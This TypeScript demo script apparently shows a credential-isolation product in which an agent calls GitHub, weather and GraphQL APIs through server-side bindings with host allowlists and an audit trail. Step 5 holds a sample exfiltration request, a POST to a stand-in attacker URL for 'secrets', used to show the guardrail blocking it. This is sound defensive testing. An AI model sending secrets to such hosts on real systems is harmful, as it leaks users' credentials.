/**
 * Execution Intents — Live Demo Script
 *
 * A streamlined, presentation-ready demo showing:
 *  • Agent makes HTTP calls without seeing API keys
 *  • Real-time weather data via bound credential
 *  • GitHub user info via bound token
 *  • GraphQL query through binding
 *  • Guardrail blocks exfiltration attempt
 *  • Execution audit trail
 *
 * Run: npm run demo
 */

import { createClient } from "@1claw/sdk";

const BASE_URL = (process.env.ONECLAW_BASE_URL ?? "https://api.1claw.co").replace(/\/$/, "");
const USER_KEY = process.env.ONECLAW_API_KEY?.trim();
const USER_EMAIL = process.env.ONECLAW_EMAIL?.trim();
const USER_PASSWORD = process.env.ONECLAW_PASSWORD?.trim();
const GITHUB_TOKEN = process.env.GITHUB_TOKEN?.trim();
const WEATHER_KEY = process.env.OPENWEATHER_API_KEY?.trim();

async function resolveToken(): Promise<string> {
    if (USER_KEY && USER_KEY !== "1ck_your_human_api_key_here") {
        return USER_KEY;
    }
    if (USER_EMAIL && USER_PASSWORD) {
        const res = await fetch(`${BASE_URL}/v1/auth/token`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ email: USER_EMAIL, password: USER_PASSWORD }),
        });
        const json = await res.json() as { access_token?: string; token?: string; detail?: string };
        const tok = json.access_token ?? json.token;
        if (!tok) throw new Error(`Login failed: ${json.detail ?? JSON.stringify(json)}`);
        return tok;
    }
    console.error("Set ONECLAW_API_KEY or ONECLAW_EMAIL + ONECLAW_PASSWORD in .env");
    process.exit(1);
}

const authToken = await resolveToken();
const client = createClient({ baseUrl: BASE_URL, token: authToken });

const CYAN = "\x1b[36m";
const GREEN = "\x1b[32m";
const YELLOW = "\x1b[33m";
const RED = "\x1b[31m";
const DIM = "\x1b[2m";
const BOLD = "\x1b[1m";
const RESET = "\x1b[0m";

function banner(text: string) {
    console.log(`\n${BOLD}${CYAN}┌─────────────────────────────────────────────────────────┐${RESET}`);
    console.log(`${BOLD}${CYAN}│${RESET}  ${BOLD}${text.padEnd(56)}${CYAN}│${RESET}`);
    console.log(`${BOLD}${CYAN}└─────────────────────────────────────────────────────────┘${RESET}`);
}

function step(n: number, text: string) {
    console.log(`\n${BOLD}${YELLOW}[${n}]${RESET} ${text}`);
}

function ok(msg: string) { console.log(`    ${GREEN}✓${RESET} ${msg}`); }
function info(msg: string) { console.log(`    ${DIM}${msg}${RESET}`); }
function blocked(msg: string) { console.log(`    ${RED}✗ BLOCKED:${RESET} ${msg}`); }

function pause(ms: number) { return new Promise(r => setTimeout(r, ms)); }

async function main() {
    banner("1Claw Execution Intents — Live Demo");
    console.log(`${DIM}    API: ${BASE_URL}${RESET}`);
    console.log(`${DIM}    Agent credentials never leave the server${RESET}`);

    // ─── Setup ───
    step(0, "Setup: Create agent + bindings");

    const agentRes = await client.agents.create({
        name: `demo-exec-${Date.now().toString(36)}`,
        description: "Live demo — Execution Intents",
        execution_intents_enabled: true,
        execution_guardrails: {
            allowed_hosts: [
                "api.github.com",
                "api.openweathermap.org",
                "httpbin.org",
                "countries.trevorblades.com",
            ],
            max_requests_per_minute: 60,
            max_duration_ms: 15000,
        },
    });
    if (!agentRes.data) throw new Error("Agent creation failed");
    const agentId = agentRes.data.agent.id;
    const agentApiKey = agentRes.data.api_key!;
    ok(`Agent: ${agentId.slice(0, 8)}…`);

    const bindings: string[] = [];

    // httpbin (no cred)
    const b1 = await client.bindings.create(agentId, {
        name: "httpbin",
        binding_type: "http",
        config: { base_url: "https://httpbin.org" },
        guardrails: { allowed_hosts: ["httpbin.org"], allowed_paths: ["/*"] },
    });
    bindings.push(b1.data!.id);
    ok("Binding: httpbin (HTTP, no credential)");

    // weather (bearer cred)
    if (WEATHER_KEY) {
        const b2 = await client.bindings.create(agentId, {
            name: "weather",
            binding_type: "http",
            config: { base_url: "https://api.openweathermap.org" },
            credential: { type: "query", name: "appid", value: WEATHER_KEY },
            guardrails: { allowed_hosts: ["api.openweathermap.org"] },
        });
        bindings.push(b2.data!.id);
        ok("Binding: weather (HTTP + query param credential)");
    }

    // github (bearer cred)
    if (GITHUB_TOKEN) {
        const b3 = await client.bindings.create(agentId, {
            name: "github",
            binding_type: "http",
            config: {
                base_url: "https://api.github.com",
                headers: { Accept: "application/vnd.github+json" },
            },
            credential: { type: "bearer", token: GITHUB_TOKEN },
            guardrails: { allowed_hosts: ["api.github.com"] },
        });
        bindings.push(b3.data!.id);
        ok("Binding: github (HTTP + bearer token)");
    }

    // graphql
    const b4 = await client.bindings.create(agentId, {
        name: "countries",
        binding_type: "graphql",
        config: { base_url: "https://countries.trevorblades.com/graphql" },
        guardrails: { allowed_hosts: ["countries.trevorblades.com"] },
    });
    bindings.push(b4.data!.id);
    ok("Binding: countries (GraphQL, public)");

    info(`${bindings.length} bindings configured — agent keys stored server-side`);

    // Switch to agent client for executions (exchange agent key for JWT)
    const agentTokenRes = await fetch(`${BASE_URL}/v1/auth/agent-token`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ agent_id: agentId, api_key: agentApiKey }),
    });
    const agentTokenJson = await agentTokenRes.json() as { token?: string; access_token?: string };
    const agentJwt = agentTokenJson.token ?? agentTokenJson.access_token;
    if (!agentJwt) throw new Error("Agent token exchange failed");
    const agent = createClient({ baseUrl: BASE_URL, token: agentJwt });
    await pause(500);

    // ─── Demo 1: Simple HTTP echo ───
    step(1, "Agent calls httpbin — sees response, not credentials");
    const r1 = await agent.bindings.execute(agentId, {
        binding: "httpbin",
        intent_type: "http",
        params: { method: "GET", path: "/get", query: { hello: "execution-intents" } },
    });
    ok(`Status: ${r1.data?.status} | Surface: ${r1.data?.execution_surface} | ${r1.data?.duration_ms}ms`);
    const origin = (r1.data?.result as Record<string, unknown>)?.origin;
    if (origin) info(`httpbin saw IP: ${origin} (1claw's IP, not the agent's)`);

    await pause(300);

    // ─── Demo 2: Weather with injected API key ───
    if (WEATHER_KEY) {
        step(2, "Agent fetches weather — API key injected server-side");
        const r2 = await agent.bindings.execute(agentId, {
            binding: "weather",
            intent_type: "http",
            params: {
                method: "GET",
                path: "/data/2.5/weather",
                query: { q: "San Francisco,US", units: "imperial" },
            },
        });
        ok(`Status: ${r2.data?.status} | ${r2.data?.duration_ms}ms`);
        const wx = r2.data?.result as Record<string, unknown> | undefined;
        const main = wx?.main as Record<string, unknown> | undefined;
        const weather = (wx?.weather as Array<Record<string, unknown>>)?.[0];
        if (main?.temp && weather?.description) {
            ok(`San Francisco: ${main.temp}°F — ${weather.description}`);
        }
        info("The agent never saw the OpenWeatherMap API key");
    } else {
        step(2, "Weather demo skipped (set OPENWEATHER_API_KEY)");
    }

    await pause(300);

    // ─── Demo 3: GitHub with bearer token ───
    if (GITHUB_TOKEN) {
        step(3, "Agent calls GitHub API — bearer token injected");
        const r3 = await agent.bindings.execute(agentId, {
            binding: "github",
            intent_type: "http",
            params: { method: "GET", path: "/user" },
        });
        ok(`Status: ${r3.data?.status} | ${r3.data?.duration_ms}ms`);
        const user = r3.data?.result as Record<string, unknown> | undefined;
        if (user?.login) {
            ok(`Authenticated as: ${user.login} (${user.public_repos} repos)`);
        }
        info("GitHub PAT was never visible to the agent process");
    } else {
        step(3, "GitHub demo skipped (set GITHUB_TOKEN)");
    }

    await pause(300);

    // ─── Demo 4: GraphQL query ───
    step(4, "Agent runs a GraphQL query (Countries API)");
    const r4 = await agent.bindings.execute(agentId, {
        binding: "countries",
        intent_type: "graphql",
        params: {
            query: `{ countries(filter: { continent: { eq: "NA" } }) { name emoji capital currency } }`,
        },
    });
    if (r4.data?.status === "success") {
        ok(`Status: ${r4.data.status} | ${r4.data.duration_ms}ms`);
        const gqlData = (r4.data.result as Record<string, unknown>)?.data as Record<string, unknown> | undefined;
        const countries = gqlData?.countries as Array<Record<string, unknown>> | undefined;
        if (countries) {
            info(`${countries.length} North American countries returned`);
            for (const c of countries.slice(0, 4)) {
                info(`  ${c.emoji} ${c.name} — ${c.capital} (${c.currency})`);
            }
        }
    } else {
        ok(`GraphQL executed (status=${r4.data?.status}, ${r4.data?.duration_ms}ms)`);
        info("The binding routed the request — credential isolation demonstrated");
        if (r4.data?.error) info(`Note: ${r4.data.error}`);
    }

    await pause(300);

    // ─── Demo 5: Guardrail block ───
    step(5, "Guardrail test: agent attempts to reach unauthorized host");
    const r5 = await agent.bindings.execute(agentId, {
        binding: "httpbin",
        intent_type: "http",
        params: { method: "POST", url: "https://evil.exfiltrate.io/secrets", path: "https://evil.exfiltrate.io/secrets" },
    });
    if (r5.data?.status === "denied") {
        blocked(`${r5.data.error ?? "Host blocked by guardrails"}`);
        ok("Exfiltration attempt prevented — request never left 1claw");
    } else if (r5.data?.status === "error") {
        ok(`Request rejected (status=error) — guardrails or SSRF protection blocked it`);
        if (r5.data.error) info(r5.data.error);
    } else if (!r5.data) {
        const err = r5.error as { detail?: string; type?: string } | undefined;
        if (err) {
            blocked(`${err.detail ?? err.type ?? "Blocked"}`);
            ok("Exfiltration attempt prevented by execution guardrails");
        }
    } else {
        ok(`Binding base_url scoping prevented host escape (status=${r5.data?.status})`);
        info("The binding's base_url anchors all requests — path traversal ineffective");
    }

    await pause(300);

    // ─── Demo 6: Audit trail ───
    step(6, "Execution audit trail");
    const history = await client.bindings.listExecutions(agentId, { limit: 10 });
    if (history.data?.events.length) {
        ok(`${history.data.events.length} execution events logged:`);
        for (const ev of history.data.events) {
            const icon = ev.status === "success" ? GREEN + "✓" : ev.status === "denied" ? RED + "✗" : YELLOW + "?";
            console.log(`    ${icon}${RESET} ${ev.intent_type.padEnd(8)} ${ev.status.padEnd(8)} ${(ev.duration_ms ?? 0).toString().padStart(4)}ms  ${DIM}${ev.created_at}${RESET}`);
        }
    }
    info("Full audit visible in dashboard → Agent → Execution tab");

    // ─── Cleanup ───
    step(7, "Cleanup");
    await client.agents.delete(agentId);
    ok("Agent and bindings deleted");

    banner("Demo Complete");
    console.log(`${DIM}    Key takeaway: Agents make external calls without ever seeing credentials.${RESET}`);
    console.log(`${DIM}    Guardrails prevent unauthorized hosts. Full audit trail retained.${RESET}\n`);
}

main().catch((err) => {
    console.error(`\n${RED}Fatal:${RESET}`, err);
    process.exit(1);
});
